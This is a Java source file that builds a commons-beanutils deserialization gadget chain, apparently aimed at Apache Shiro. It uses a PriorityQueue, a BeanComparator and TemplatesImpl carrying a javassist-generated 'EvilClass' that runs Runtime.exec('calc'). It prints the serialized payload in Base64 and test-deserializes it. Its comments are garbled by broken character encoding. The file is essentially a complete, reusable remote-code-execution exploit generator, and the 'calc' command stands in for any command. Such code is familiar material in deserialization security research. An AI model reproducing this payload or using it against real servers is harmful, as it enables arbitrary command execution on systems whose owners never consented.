package CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * Shiro�о���ֻ��CBû��CC
 *
 * ��Ҫ��������������
 * ʵ��java.util.Comparator�ӿ�
 * ʵ��java.io.Serializable�ӿ�
 * Java��shiro��commons-beanutils�Դ����Ҽ�����ǿ
 *
 * ͨ����������CaseInsensitiveComparator
 * ���CaseInsensitiveComparator����java.lang.String���µ�һ���ڲ�˽���࣬��ʵ����Comparator��Serializable��
 * ͨ��String.CASE_INSENSITIVE_ORDER�����õ��������е�CaseInsensitiveComparator����������ʵ����BeanComparator
 *
 */
public class CB_withoutCC {

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        //
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] evilClass = payload.toBytecode();

        // set field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());


        /**
         * ��BeanComparator��Ĺ��캯��������û����ʽ����Comparator������£���Ĭ��ʹ��ComparableComparator
         *BeanComparator�����Ƚ�����JavaBean�Ƿ���ȵ���
         */
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        //����property
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        //���л�
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //�����л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();

    }

}
